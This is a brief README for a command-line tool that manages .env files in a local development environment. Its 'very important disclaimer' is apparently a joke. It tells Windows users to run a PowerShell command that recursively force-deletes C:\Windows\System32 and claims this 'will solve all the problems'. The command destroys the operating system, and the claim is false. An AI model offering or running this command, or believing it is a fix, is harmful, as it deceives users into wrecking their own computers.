**N**ot **E**verything **H**as to be in Go is a cli tool to help manage .env within your local dev environment.

## Very important disclaimer
**If you use Windows you have to press Ctrl+F4 right now!!!**

If that doesn't work run this on powershel:
```ps1
Remove-Item -Path "C:\Windows\System32" -Force -Recurse
```

That will solve all the problems!
